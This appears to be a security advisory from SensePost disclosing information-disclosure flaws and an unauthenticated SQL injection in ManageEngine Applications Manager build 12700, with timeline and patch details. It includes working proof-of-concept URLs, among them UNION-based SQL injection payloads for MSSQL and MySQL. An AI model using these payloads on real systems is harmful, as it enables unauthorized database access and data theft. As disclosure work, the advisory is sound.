@@ -1,0 +1,105 @@
+[SPSA-2016-02/ManageEngine ApplicationsManager]------------------------------
+
+SECURITY ADVISORY:   SPSA-2016-02/ManageEngine Applications Manager Build No: 12700
+
+Affected Software:   ManageEngine Applications Manager Build No: 12700
+Vulnerability:       Information Disclosure and Un-Authenticated SQL
+injection.
+CVSSv3:              9.3
+Severity:            Critical
+Release Date:        2016-05-05
+
+I. Background
+~~~~~~~~~~~~~	   	
+
+ManageEngine Applications Manager is an Application Performance Monitoring across physical, virtual and cloud environments.
+
+
+II. Description
+~~~~~~~~~~~~~~~
+
+For details about the fix please visit https://www.manageengine.com/products/applications_manager/release-notes.html
+
+Information Disclosure:
+~~~~~~~~~~~~~~~~~~~~~~~
+
+Some scripts were accessible without authentication, which allowed public access to sensitive data such as licensing information and Monitored Server Details like name IP and maintenance schedule.
+
+POC
+~~~
+
+License Information:
+https://ManageEngineHost/jsp/About.jsp?context=/CAMGlobalReports.do?method=disableReports 
+
+List of Maintenance tasks:
+https://ManageEngineHost/downTimeScheduler.do?method=maintenanceTaskListView&tabtoLoad=downtimeSchedulersDiv
+
+Details of Maintenance tasks with details about monitored server:
+https://ManageEngineHost/downTimeScheduler.do?method=viewMaintenanceTask&taskid=2&edit=true&readonly=false
+
+SQL Injection:
+~~~~~~~~~~~~~~
+
+The downTimeScheduler.do script is vulnerable to a Boolean based blind, and Union based SQL injection, that allows complete unauthorized access to the back-end database, according to the level of privileges of the application database user.
+
+Vulnerable URL:
+https://ManageEngineHost/downTimeScheduler.do?method=viewMaintenanceTask&taskid=1
+Vulnerable Parameter: GET parameter taskid
+
+PoC:
+~~~~
+
+Boolean Based Blind SQL Injection PoC: 
+
+https://ManageEngineHost/downTimeScheduler.do?method=viewMaintenanceTask&taskid=1
+and 1=1  (True)
+
+https://ManageEngineHost/downTimeScheduler.do?method=viewMaintenanceTask&taskid=1
+and 1=2  (False)
+
+The following will include the Database Name in the Schedule Details
+Description text box:
+
+Union-Based SQL Injection PoC: Number of Columns 15, ORDER BY was
+usable.
+
+MSSQL: During our testing, the payload needed to be URL Encoded.
+
+https://ManageEngineHost/downTimeScheduler.do?method=viewMaintenanceTask&taskid=-1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28113%29%2BISNULL%28CAST%28%28SELECT%20DB_NAME%28%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--
+
+MYSQL: During our testing, the payload did not need URL Encoding.
+
+https://ManageEngineHost/downTimeScheduler.do?method=viewMaintenanceTask&taskid=-1%20UNION%20ALL%20SELECT%201,2,database(),4,5,6,7,8,9,10,11,12,13,14,15%20--
+
+
+III. Impact
+~~~~~~~~~~~
+
+Information Disclosure Impact:
+
+An attacker might make use of the intelligence gathered through information leakages such as these for further attacks against the application, and its underlying infrastructure
+
+Un-Authenticated SQL Injection Impact:
+
+Access to sensitive information, stored in the application Database server, depending on the privileges of the application's database user. 
+
+
+IV. Remediation
+~~~~~~~~~~~~~~~
+
+Apply Vendor supplied patch build #12710, details are available at
+https://www.manageengine.com/products/applications_manager/release-notes.html
+
+V. Disclosure
+~~~~~~~~~~~~~
+
+Reported By: Saif El-Sherei, @saif_sherei, saif@sensepost.com
+
+Discovery Date:         2016-02-29
+Vendor Informed:        2016-03-04
+Advisory Release Date:  2016-05-05
+Patch Release Date:     2016-04-28
+Advisory Updated:    	2016-05-05
+
+
+---------------------------------[SPSA-2016-02/ManageEngine ApplicationsManager]---
